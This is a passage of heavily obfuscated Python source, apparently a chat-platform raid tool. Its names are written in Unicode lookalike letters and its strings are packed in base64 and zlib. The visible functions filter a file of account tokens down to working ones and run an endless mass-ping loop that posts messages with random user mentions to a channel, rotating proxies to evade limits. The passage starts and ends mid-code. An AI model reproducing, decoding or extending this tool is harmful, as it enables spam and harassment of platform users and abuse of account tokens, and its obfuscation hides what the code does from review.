0.8537282030596932j))]).decompress(b'x\xda\x8br\x0f\xabJ4\x0e*Kv\xb4\xb5\x05\x00\x1a\xa4\x03\xec')).decode()}}}))
        𝘄𝘴.send(𝗷𝙨𝗼𝗻.dumps({__𝗶𝘮𝙥𝙤𝗿𝘁__(𝙡𝗠𝗜𝙄𝘔𝙡𝘔𝗡𝙄𝘐𝗡𝙈𝙡𝙡𝘐𝗠𝗹𝘔𝙡𝙄𝗠𝗜𝗠𝘐𝘕𝘔𝘐𝗹𝗹𝗹𝘕𝙡[𝗿𝗼𝘂𝘯𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝘁__(𝙡𝘔𝘐𝙄𝘔𝘭𝗠𝘕𝗜𝗜𝘕𝗠𝙡𝙡𝙄𝘔𝗹𝗠𝙡𝘐𝗠𝙄𝙈𝘐𝗡𝙈𝘐𝗹𝗹𝘭𝗡𝗹[𝗿𝘰𝘂𝙣𝗱(𝗮𝗯𝘴(0.6841132492129405 + 0.7293758031709807j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode(): 𝗿𝘰𝘂𝗻𝗱(𝗮𝘣𝘴(1.7696222420356609 + 3.5872603920669994j)), __𝙞𝙢𝘱𝗼𝙧𝘵__(𝗹𝗠𝗜𝗜𝗠𝗹𝘔𝗡𝗜𝘐𝘕𝗠𝙡𝙡𝗜𝙈𝘭𝗠𝗹𝘐𝙈𝙄𝘔𝙄𝘕𝙈𝗜𝘭𝗹𝙡𝙉𝘭[𝙧𝗼𝘂𝗻𝗱(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__(𝘭𝘔𝘐𝙄𝘔𝗹𝙈𝗡𝙄𝗜𝘕𝙈𝙡𝘭𝙄𝗠𝘭𝘔𝙡𝙄𝗠𝘐𝘔𝙄𝙉𝗠𝗜𝙡𝗹𝗹𝗡𝙡[𝘳𝗼𝙪𝗻𝙙(𝙖𝘣𝘀(0.6764703085635163 + 0.7364699054489471j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode(): {__𝘪𝗺𝙥𝘰𝘳𝘁__(𝗹𝗠𝙄𝘐𝙈𝙡𝙈𝗡𝘐𝘐𝘕𝘔𝘭𝙡𝘐𝘔𝙡𝙈𝙡𝙄𝘔𝗜𝘔𝙄𝘕𝙈𝙄𝗹𝙡𝙡𝗡𝗹[𝘳𝘰𝙪𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝘳𝙩__(𝙡𝗠𝙄𝗜𝘔𝘭𝗠𝙉𝘐𝘐𝙉𝗠𝘭𝘭𝘐𝘔𝘭𝘔𝙡𝘐𝘔𝗜𝘔𝘐𝗡𝗠𝙄𝗹𝙡𝙡𝙉𝘭[𝗿𝙤𝘶𝙣𝘥(𝙖𝙗𝘀(0.3760569419610196 + 0.9265965553588715j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJK\x0c\x0f\xb4\x05\x00\x1a\x14\x03\xfb')).decode(): 𝗴𝙪𝙞𝗹𝘥, __𝘪𝗺𝗽𝙤𝘳𝘵__(𝗹𝘔𝗜𝙄𝘔𝗹𝙈𝙉𝘐𝘐𝘕𝙈𝙡𝗹𝘐𝗠𝗹𝘔𝗹𝗜𝘔𝗜𝘔𝗜𝘕𝗠𝗜𝘭𝙡𝙡𝗡𝗹[𝘳𝘰𝙪𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝙧𝘁__(𝙡𝘔𝙄𝘐𝗠𝙡𝙈𝗡𝗜𝗜𝘕𝗠𝗹𝘭𝗜𝘔𝙡𝘔𝗹𝙄𝙈𝗜𝙈𝘐𝙉𝗠𝘐𝘭𝗹𝘭𝙉𝘭[𝘳𝗼𝙪𝘯𝘥(𝙖𝘣𝘀(0.10808805070749017 + 0.9941413246084558j))]).decompress(b'x\xda\x8b4\xca\xc8H\xca5\xcdIr\xb3,\x88r\xb4\xb5\x05\x00.\r\x052')).decode(): 𝘤𝘩𝙖𝘯𝗻𝘦𝗹, __𝘪𝗺𝘱𝙤𝙧𝘁__(𝘭𝘔𝘐𝘐𝗠𝗹𝙈𝘕𝙄𝗜𝘕𝘔𝙡𝗹𝙄𝘔𝙡𝗠𝘭𝘐𝙈𝙄𝙈𝘐𝘕𝗠𝗜𝙡𝙡𝙡𝙉𝙡[𝘳𝘰𝘂𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__(𝙡𝗠𝘐𝙄𝙈𝘭𝘔𝗡𝗜𝙄𝘕𝙈𝙡𝙡𝙄𝘔𝘭𝗠𝙡𝘐𝙈𝗜𝘔𝙄𝘕𝗠𝗜𝘭𝙡𝗹𝘕𝘭[𝗿𝙤𝘂𝗻𝗱(𝘢𝙗𝙨(0.4210577708173945 + 0.907033821659527j))]).decompress(b'x\xdaK6\n+\x8e\xca\xb1,I\x89\x08\xca\x01\x00\x1bC\x04L')).decode(): False, __𝙞𝗺𝗽𝙤𝗿𝘁__(𝘭𝙈𝙄𝘐𝙈𝘭𝗠𝘕𝙄𝙄𝘕𝙈𝗹𝗹𝘐𝘔𝘭𝙈𝗹𝙄𝙈𝘐𝙈𝘐𝙉𝘔𝙄𝘭𝘭𝘭𝙉𝘭[𝙧𝗼𝘂𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__(𝘭𝙈𝗜𝘐𝙈𝙡𝘔𝙉𝗜𝗜𝗡𝙈𝗹𝗹𝙄𝗠𝗹𝙈𝘭𝘐𝙈𝗜𝘔𝙄𝗡𝙈𝙄𝗹𝘭𝙡𝗡𝘭[𝙧𝘰𝘶𝗻𝙙(𝙖𝗯𝘀(0.9528630576448909 + 0.3034007141976258j))]).decompress(b'x\xdaK6\n+\x8e\xca\xb1\xcc\x8e\nw\xcb\x05\x00\x1a\xd4\x04-')).decode(): False}}))
        𝗽𝘳𝗶𝘯𝘵(__𝗶𝘮𝗽𝗼𝗿𝘁__(𝙡𝘔𝙄𝗜𝘔𝘭𝙈𝘕𝗜𝗜𝗡𝗠𝙡𝗹𝗜𝘔𝗹𝗠𝙡𝙄𝗠𝗜𝙈𝙄𝙉𝗠𝙄𝘭𝘭𝘭𝗡𝘭[𝙧𝙤𝘶𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝙤𝘳𝘵__(𝙡𝗠𝗜𝙄𝗠𝗹𝘔𝙉𝗜𝗜𝘕𝙈𝙡𝙡𝗜𝗠𝗹𝗠𝗹𝗜𝗠𝙄𝘔𝗜𝘕𝘔𝙄𝘭𝘭𝘭𝘕𝘭[𝙧𝘰𝙪𝘯𝙙(𝘢𝗯𝙨(0.6233384092152959 + 0.781952190096648j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xce\xb5,H\xca\r\xcb\x86\x89\xa5\x1a\x1b\x14z\xa7\xdb\xda\x02\x00\x01\x8f\x0c\x97')).decode().format(𝗿, 𝗱𝘢𝙩𝘦𝘁𝘪𝙢𝘦.datetime.now().strftime(f"{𝗴}{__𝙞𝙢𝙥𝘰𝘳𝙩__(𝘭𝗠𝗜𝙄𝙈𝙡𝘔𝘕𝙄𝗜𝙉𝗠𝙡𝗹𝗜𝗠𝗹𝙈𝘭𝘐𝗠𝘐𝘔𝘐𝙉𝗠𝙄𝗹𝙡𝗹𝙉𝘭[𝘳𝙤𝙪𝘯𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝙧, 𝙡𝗰, 𝘳, 𝘯𝗻, 𝘨))

def save_tokens(file_path):
    𝘃𝘢𝗹𝙞𝘥_𝘵𝗼𝗸𝘦𝙣𝘀 = 𝗿𝙤𝘂𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))
    𝘵𝘰𝗸𝘦𝘯𝘴_𝘃𝘢𝗹𝗶𝗱 = []
    𝘵𝙤𝙠𝙚𝗻𝘴 = 𝗼𝙥𝙚𝙣(𝘧𝙞𝙡𝘦_𝙥𝘢𝘁𝘩, __𝙞𝗺𝘱𝗼𝗿𝙩__(𝙡𝙈𝙄𝘐𝗠𝙡𝗠𝙉𝙄𝘐𝗡𝘔𝗹𝙡𝙄𝘔𝘭𝘔𝗹𝘐𝗠𝗜𝗠𝙄𝘕𝗠𝗜𝙡𝘭𝘭𝙉𝗹[𝗿𝗼𝙪𝙣𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝗿𝘁__(𝙡𝘔𝘐𝗜𝘔𝙡𝗠𝘕𝗜𝘐𝘕𝗠𝘭𝘭𝙄𝗠𝙡𝘔𝘭𝙄𝙈𝗜𝗠𝘐𝗡𝘔𝘐𝙡𝘭𝙡𝘕𝘭[𝘳𝙤𝘶𝗻𝙙(𝘢𝙗𝙨(0.05425060180519481 + 0.998527351755461j))]).decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode()).read().splitlines()
    for 𝘵𝘰𝙠𝗲𝗻 in 𝘵𝗼𝘬𝙚𝗻𝘴:
        if 𝗰𝘩𝗲𝙘𝙠_𝘵𝗼𝙠𝙚𝗻(𝘁𝗼𝙠𝙚𝙣):
            𝙫𝙖𝙡𝗶𝗱_𝘵𝙤𝗸𝙚𝘯𝘀 += 𝘳𝘰𝘂𝙣𝗱(𝙖𝗯𝘴(0.7786827572459863 + 0.6274178540397048j))
            𝘵𝘰𝙠𝘦𝗻𝘴_𝙫𝗮𝙡𝙞𝙙.append(𝙩𝙤𝙠𝘦𝘯)
    with 𝘰𝗽𝘦𝗻(𝘧𝘪𝗹𝗲_𝙥𝙖𝘁𝗵, __𝙞𝘮𝗽𝙤𝙧𝘵__(𝙡𝙈𝙄𝗜𝘔𝗹𝗠𝗡𝗜𝗜𝙉𝗠𝘭𝙡𝘐𝘔𝙡𝗠𝙡𝘐𝗠𝙄𝗠𝗜𝙉𝘔𝘐𝙡𝗹𝗹𝙉𝙡[𝘳𝙤𝘶𝘯𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝗿𝘵__(𝙡𝘔𝙄𝙄𝙈𝘭𝗠𝗡𝙄𝘐𝙉𝙈𝙡𝘭𝘐𝙈𝙡𝙈𝙡𝙄𝗠𝗜𝙈𝘐𝗡𝙈𝙄𝘭𝗹𝙡𝗡𝗹[𝗿𝙤𝘶𝗻𝗱(𝙖𝙗𝘴(0.5611288590744172 + 0.8277284600120035j))]).decompress(b'x\xdaK\xa9,\xb6\x05\x00\x04"\x01\x8e')).decode()) as 𝙛:
        𝘧.truncate(𝗿𝙤𝙪𝙣𝙙(𝘢𝙗𝘀(0.0 + 0j)))
    with 𝙤𝙥𝙚𝙣(𝙛𝙞𝗹𝘦_𝙥𝙖𝘵𝘩, __𝘪𝗺𝙥𝘰𝗿𝘁__(𝗹𝘔𝘐𝙄𝙈𝙡𝗠𝘕𝘐𝘐𝙉𝘔𝗹𝗹𝗜𝙈𝙡𝘔𝗹𝘐𝗠𝘐𝘔𝘐𝘕𝙈𝘐𝘭𝘭𝗹𝘕𝙡[𝗿𝗼𝘶𝙣𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__(𝘭𝗠𝗜𝙄𝘔𝙡𝙈𝘕𝘐𝗜𝙉𝘔𝙡𝙡𝘐𝗠𝘭𝘔𝙡𝗜𝗠𝘐𝗠𝙄𝙉𝘔𝙄𝗹𝙡𝙡𝗡𝘭[𝘳𝘰𝘂𝘯𝘥(𝗮𝗯𝘀(0.45036278802496865 + 0.8928456524855666j))]).decompress(b'x\xda\x8b\x0c.\xb6\x05\x00\x03\x84\x01]')).decode()) as 𝙛:
        for 𝘁𝗼𝗸𝘦𝗻 in 𝘁𝗼𝗸𝙚𝘯𝘀_𝙫𝘢𝙡𝙞𝘥:
            𝗳.write(𝘁𝗼𝗸𝙚𝘯 + __𝘪𝘮𝗽𝘰𝙧𝘵__(𝗹𝘔𝙄𝙄𝘔𝗹𝙈𝙉𝗜𝙄𝘕𝙈𝗹𝙡𝗜𝗠𝙡𝗠𝘭𝙄𝗠𝘐𝘔𝙄𝘕𝙈𝘐𝗹𝗹𝘭𝗡𝗹[𝙧𝘰𝘂𝗻𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__(𝙡𝘔𝗜𝙄𝗠𝙡𝗠𝙉𝗜𝙄𝘕𝘔𝗹𝗹𝘐𝘔𝘭𝗠𝘭𝗜𝙈𝗜𝗠𝘐𝘕𝙈𝙄𝙡𝙡𝘭𝗡𝙡[𝙧𝗼𝘶𝙣𝗱(𝙖𝙗𝘴(0.01910229554883014 + 0.9998175345055542j))]).decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())

def massping(token, channel, message, delay, pings):
    𝘩𝗲𝙖𝗱𝙚𝘳𝘀 = 𝘏𝙚𝗮𝙙𝘦𝙧𝘴(𝙩𝗼𝗸𝙚𝗻)
    while True:
        𝙙𝘯 = 𝘵𝙤𝘬𝗲𝙣.split(__𝗶𝙢𝘱𝘰𝗿𝘵__(𝗹𝘔𝘐𝗜𝙈𝙡𝗠𝗡𝘐𝙄𝗡𝘔𝗹𝙡𝘐𝘔𝘭𝘔𝘭𝙄𝘔𝙄𝙈𝙄𝘕𝗠𝘐𝘭𝗹𝗹𝘕𝙡[𝙧𝙤𝘶𝘯𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝙧𝘵__(𝗹𝙈𝗜𝗜𝗠𝗹𝙈𝙉𝙄𝘐𝗡𝙈𝗹𝙡𝘐𝘔𝙡𝗠𝗹𝗜𝘔𝙄𝗠𝗜𝗡𝗠𝙄𝘭𝗹𝘭𝗡𝘭[𝗿𝘰𝘶𝙣𝙙(𝘢𝘣𝘴(0.07615983479712374 + 0.9970956220762756j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
        𝘯𝙣 = 𝙙𝗻[𝗿𝗼𝘶𝘯𝙙(𝙖𝗯𝘀(0.0 + 0j))]
        𝙙𝙖𝘁𝙖 = {__𝙞𝙢𝗽𝙤𝘳𝘁__(𝙡𝗠𝘐𝘐𝘔𝙡𝘔𝗡𝙄𝘐𝙉𝙈𝙡𝙡𝗜𝘔𝗹𝙈𝙡𝙄𝙈𝗜𝙈𝗜𝘕𝙈𝗜𝙡𝙡𝙡𝗡𝙡[𝗿𝘰𝘂𝘯𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝘳𝙩__(𝘭𝗠𝗜𝙄𝙈𝗹𝘔𝙉𝗜𝗜𝗡𝘔𝙡𝗹𝗜𝘔𝗹𝙈𝗹𝗜𝘔𝘐𝗠𝙄𝙉𝗠𝙄𝘭𝗹𝙡𝘕𝗹[𝘳𝙤𝘂𝘯𝙙(𝙖𝙗𝙨(0.09020528608531253 + 0.9959231930034901j))]).decompress(b'x\xda\x8b4\xb2,Mq\x0f+Mq\xb4\xb5\x05\x00\x19\x1d\x03\xcf')).decode(): __𝙞𝘮𝘱𝗼𝗿𝘁__(𝗹𝗠𝗜𝗜𝗠𝗹𝗠𝙉𝙄𝘐𝙉𝘔𝘭𝙡𝘐𝗠𝘭𝘔𝗹𝙄𝗠𝙄𝘔𝙄𝘕𝗠𝘐𝗹𝙡𝘭𝗡𝙡[𝗿𝗼𝘂𝘯𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__(𝙡𝗠𝘐𝙄𝘔𝗹𝗠𝙉𝗜𝙄𝗡𝗠𝘭𝘭𝙄𝗠𝗹𝗠𝘭𝗜𝘔𝗜𝗠𝙄𝘕𝘔𝙄𝙡𝗹𝙡𝙉𝘭[𝙧𝗼𝘂𝘯𝗱(𝘢𝗯𝘴(0.10110545610711585 + 0.9948757142203101j))]).decompress(b'x\xdaK56HO56\xb0\x05\x00\n\x82\x025')).decode().format(𝗺𝘦𝙨𝘴𝗮𝙜𝙚, 𝗴𝘦𝘁𝘳𝙖𝘯𝗱𝗼𝙢𝙞𝙙𝙨(𝗽𝘉𝙣𝙁𝘰𝘠𝘭𝗛𝙃𝗗𝗳𝙟𝗱𝗩𝙙𝗳𝘨𝗲𝙖𝗨𝗾𝙗𝗖𝘾𝙞𝘯𝗻𝗻8𝙢𝙪𝘐.mro()[8](𝙥𝙞𝙣𝘨𝘴)))}
        𝘀𝘭𝗲𝗲𝗽(𝙙𝘦𝙡𝗮𝘆)
        if 𝘱𝘳𝗼𝙭𝘺:
            𝗿𝙧 = 𝗿𝘦𝘲𝘶𝘦𝙨𝘵𝙨.post(__𝙞𝙢𝙥𝙤𝙧𝘁__(𝗹𝘔𝙄𝘐𝗠𝙡𝘔𝗡𝗜𝙄𝙉𝘔𝗹𝗹𝗜𝗠𝗹𝘔𝘭𝗜𝗠𝙄𝙈𝙄𝗡𝙈𝘐𝘭𝙡𝗹𝘕𝘭[𝙧𝗼𝘂𝗻𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝘵__(𝙡𝗠𝘐𝘐𝙈𝘭𝘔𝗡𝘐𝘐𝗡𝘔𝗹𝘭𝗜𝗠𝙡𝗠𝙡𝙄𝘔𝗜𝙈𝘐𝘕𝙈𝗜𝗹𝘭𝘭𝗡𝙡[𝘳𝘰𝘶𝘯𝗱(𝗮𝗯𝘴(0.3354149495940858 + 0.9420704918363577j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(K\n\x0f\xabJ6r\xcb\x8b\x8a\xf0\xb5\x05\x00\xc6\xe7\x16\x0f')).decode().format(𝙘𝘩𝙖𝘯𝘯𝗲𝗹), headers=𝙝𝘦𝙖𝘥𝗲𝙧𝙨, json=𝗱𝗮𝘵𝗮, proxy={__𝗶𝗺𝗽𝗼𝗿𝘵__(𝘭𝘔𝗜𝙄𝘔𝗹𝘔𝗡𝗜𝙄𝘕𝙈𝘭𝙡𝘐𝙈𝗹𝙈𝙡𝗜𝙈𝙄𝘔𝗜𝗡𝙈𝙄𝙡𝗹𝙡𝗡𝘭[𝘳𝙤𝘶𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝗿𝘵__(𝙡𝙈𝘐𝗜𝗠𝙡𝙈𝘕𝗜𝘐𝙉𝘔𝗹𝙡𝗜𝙈𝘭𝗠𝙡𝙄𝘔𝘐𝙈𝗜𝗡𝗠𝘐𝘭𝗹𝙡𝘕𝘭[𝙧𝙤𝙪𝗻𝘥(𝘢𝙗𝙨(0.08698659309963297 + 0.9962094822982358j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝙞𝘮𝙥𝘰𝘳𝘁__(𝗹𝙈𝗜𝙄𝘔𝗹𝘔𝗡𝗜𝘐𝘕𝘔𝘭𝘭𝙄𝘔𝙡𝗠𝗹𝗜𝘔𝙄𝘔𝘐𝙉𝘔𝗜𝙡𝘭𝙡𝗡𝗹[𝗿𝗼𝙪𝘯𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝙧𝘵__(𝙡𝘔𝗜𝙄𝘔𝙡𝘔𝘕𝘐𝘐𝙉𝙈𝘭𝗹𝘐𝗠𝗹𝗠𝘭𝘐𝘔𝙄𝗠𝗜𝘕𝙈𝗜𝙡𝙡𝙡𝘕𝙡[𝙧𝗼𝙪𝗻𝗱(𝘢𝘣𝘀(0.4474131991982736 + 0.894327361307461j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝘢𝙣𝗱𝗼𝗺.choice(𝗽𝙧𝘰𝙭𝘪𝘦𝙨), __𝙞𝙢𝘱𝘰𝘳𝘁__(𝘭𝘔𝙄𝙄𝘔𝗹𝙈𝙉𝘐𝘐𝘕𝗠𝙡𝘭𝘐𝘔𝘭𝙈𝗹𝘐𝙈𝘐𝙈𝘐𝗡𝘔𝘐𝗹𝘭𝘭𝙉𝗹[𝘳𝘰𝘶𝙣𝙙(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝘳𝘁__(𝙡𝙈𝙄𝙄𝗠𝙡𝙈𝗡𝘐𝙄𝗡𝘔𝘭𝘭𝙄𝙈𝗹𝗠𝘭𝙄𝘔𝗜𝗠𝘐𝙉𝗠𝗜𝗹𝘭𝗹𝘕𝗹[𝗿𝘰𝘂𝗻𝙙(𝗮𝙗𝘀(0.6088721259212263 + 0.7932683872915688j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝗶𝗺𝙥𝘰𝘳𝙩__(𝗹𝘔𝙄𝘐𝗠𝘭𝗠𝗡𝗜𝗜𝘕𝘔𝙡𝗹𝗜𝗠𝙡𝘔𝙡𝙄𝗠𝗜𝙈𝗜𝘕𝗠𝘐𝙡𝘭𝙡𝘕𝙡[𝗿𝙤𝘂𝘯𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__(𝘭𝙈𝘐𝘐𝗠𝙡𝘔𝘕𝙄𝘐𝗡𝘔𝙡𝗹𝗜𝙈𝗹𝗠𝗹𝘐𝗠𝘐𝘔𝘐𝗡𝗠𝙄𝘭𝗹𝗹𝘕𝘭[𝙧𝘰𝙪𝘯𝙙(𝘢𝘣𝘀(0.9904494925086759 + 0.13787604138974408j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝘢𝙣𝙙𝙤𝙢.choice(𝙥𝗿𝘰𝙭𝘪𝙚𝘀)})
        else:
            𝘳𝙧 = 𝘳𝗲𝘲𝘶𝘦𝙨𝙩𝘀.post(__𝙞𝗺𝙥𝘰𝙧𝙩__(𝘭𝘔𝗜𝘐𝘔𝙡𝙈𝙉𝗜𝙄𝗡𝙈𝗹𝘭𝘐𝗠𝘭𝙈𝗹𝗜𝘔𝗜𝙈𝗜𝘕𝙈𝙄𝗹𝘭𝙡𝙉𝙡[𝗿𝗼𝘂𝙣𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝗿𝘁__(𝙡𝘔𝘐𝘐𝙈𝙡𝙈𝙉𝗜𝘐𝘕𝗠𝙡𝘭𝙄𝙈𝙡𝘔𝗹𝗜𝗠𝗜𝗠𝘐𝘕𝘔𝗜𝘭𝙡𝗹𝘕𝙡[𝙧𝙤𝙪𝗻𝙙(𝗮𝙗𝘀(0.6085148537927424 + 0.7935424832443423j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(K\n\x0f\xabJ6r\xcb\x8b\x8a\xf0\xb5\x05\x00\xc6\xe7\x16\x0f')).decode().format(𝗰𝗵𝘢𝘯𝗻𝙚𝗹), headers=𝘩𝘦𝗮𝙙𝙚𝘳𝘀, json=𝙙𝙖𝘵𝗮)
        if 𝙧𝘳.status_code == 𝙧𝘰𝙪𝙣𝙙(𝘢𝙗𝘀(33.1644917357407 + 197.23112454151345j)):
            𝘱𝘳𝗶𝘯𝙩(__𝙞𝗺𝗽𝘰𝘳𝘵__(𝘭𝙈𝘐𝗜𝙈𝙡𝙈𝘕𝘐𝙄𝗡𝙈𝗹𝘭𝘐𝘔𝙡𝘔𝗹𝗜𝘔𝘐𝗠𝘐𝙉𝘔𝙄𝘭𝗹𝘭𝘕𝘭[𝘳𝘰𝙪𝘯𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝙧𝙩__(𝘭𝘔𝘐𝙄𝙈𝘭𝙈𝗡𝗜𝘐𝙉𝗠𝙡𝘭𝘐𝘔𝗹𝘔𝗹𝙄𝗠𝘐𝗠𝘐𝘕𝙈𝙄𝘭𝗹𝘭𝘕𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝙗𝘴(0.16220137345811014 + 0.9867576776738566j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\n+M\x01\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xcd\xa6\x0bh')).decode().format(𝙧, 𝗱𝘢𝙩𝘦𝙩𝗶𝘮𝘦.datetime.now().strftime(f"{𝙜}{__𝗶𝗺𝗽𝗼𝘳𝘵__(𝗹𝗠𝘐𝘐𝙈𝗹𝗠𝙉𝗜𝙄𝗡𝘔𝙡𝗹𝙄𝗠𝘭𝙈𝗹𝘐𝗠𝗜𝙈𝗜𝘕𝙈𝘐𝘭𝙡𝗹𝗡𝗹[𝗿𝘰𝘶𝘯𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝗿, 𝙡𝙘, 𝘳, 𝙣𝙣, 𝗴))
        elif 𝘳𝗿.status_code == 𝙧𝙤𝘶𝗻𝙙(𝘢𝙗𝙨(274.45833436947044 + 295.0959550640028j)):
            𝗽𝘳𝘪𝘯𝘁(__𝗶𝘮𝘱𝗼𝘳𝘁__(𝗹𝙈𝘐𝙄𝘔𝘭𝗠𝗡𝗜𝙄𝘕𝘔𝘭𝘭𝙄𝙈𝘭𝗠𝙡𝘐𝗠𝘐𝗠𝙄𝘕𝘔𝗜𝙡𝘭𝙡𝘕𝙡[𝗿𝗼𝙪𝙣𝙙(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__(𝗹𝗠𝙄𝙄𝗠𝘭𝘔𝗡𝘐𝗜𝗡𝗠𝙡𝘭𝗜𝘔𝗹𝙈𝗹𝙄𝘔𝗜𝗠𝗜𝗡𝗠𝙄𝗹𝘭𝗹𝘕𝙡[𝗿𝗼𝙪𝙣𝙙(𝙖𝗯𝘴(0.016390513212880764 + 0.9998656665155666j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝗿, 𝙙𝙖𝘁𝙚𝘵𝗶𝗺𝙚.datetime.now().strftime(f"{𝗴}{__𝗶𝙢𝗽𝙤𝘳𝙩__(𝗹𝗠𝗜𝘐𝘔𝘭𝙈𝗡𝗜𝗜𝗡𝙈𝘭𝗹𝘐𝗠𝘭𝘔𝙡𝗜𝗠𝙄𝙈𝗜𝘕𝗠𝘐𝗹𝗹𝘭𝘕𝘭[𝗿𝘰𝘂𝘯𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝗿, 𝗯, 𝘳, 𝙣𝘯, 𝘨, 𝗿𝙧.text))
            return
        else:
            𝘱𝘳𝘪𝘯𝘁(__𝗶𝘮𝙥𝘰𝘳𝘵__(𝘭𝘔𝘐𝗜𝘔𝘭𝙈𝗡𝗜𝙄𝘕𝗠𝙡𝘭𝙄𝗠𝙡𝘔𝗹𝙄𝘔𝙄𝘔𝗜𝙉𝘔𝙄𝙡𝙡𝗹𝗡𝘭[𝗿𝗼𝘂𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__(𝘭𝗠𝙄𝙄𝗠𝗹𝙈𝙉𝘐𝘐𝘕𝙈𝘭𝙡𝙄𝙈𝘭𝘔𝙡𝗜𝙈𝘐𝘔𝙄𝗡𝘔𝗜𝘭𝘭𝘭𝗡𝗹[𝘳𝗼𝘶𝘯𝗱(𝘢𝙗𝘴(0.05552399618589621 + 0.9984573530439588j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝘳, 𝘥𝘢𝘁𝙚𝙩𝗶𝗺𝘦.datetime.now().strftime(f"{𝙜}{__𝘪𝙢𝙥𝗼𝘳𝘵__(𝗹𝗠𝘐𝘐𝘔𝙡𝘔𝘕𝘐𝗜𝗡𝘔𝙡𝙡𝙄𝗠𝗹𝗠𝘭𝙄𝗠𝙄𝗠𝗜𝗡𝙈𝙄𝗹𝘭𝘭𝗡𝙡[𝙧𝗼𝘂𝘯𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝙧, 𝗯, 𝘳, 𝘯𝙣, 𝙜, 𝗿𝘳.text))

def spammer(token, channel, message, delay):
